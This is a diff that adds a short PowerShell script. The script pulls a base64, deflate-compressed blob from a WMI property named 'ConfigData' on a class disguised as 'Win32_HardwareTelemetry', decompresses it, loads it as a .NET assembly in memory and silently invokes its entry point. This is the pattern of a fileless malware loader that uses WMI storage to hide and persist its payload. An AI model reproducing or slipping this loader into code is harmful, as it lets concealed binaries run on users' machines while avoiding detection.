@@ -1,0 +1,10 @@
+$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
+$o = New-Object IO.MemoryStream;
+$d = New-Object IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String($file),[IO.Compression.CompressionMode]::Decompress);
+$b = New-Object Byte[](1024);
+$r = $d.Read($b,0,1024);
+while($r -gt 0){
+    $o.Write($b,0,$r);
+    $r = $d.Read($b,0,1024);
+}
+[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@()))|Out-Null
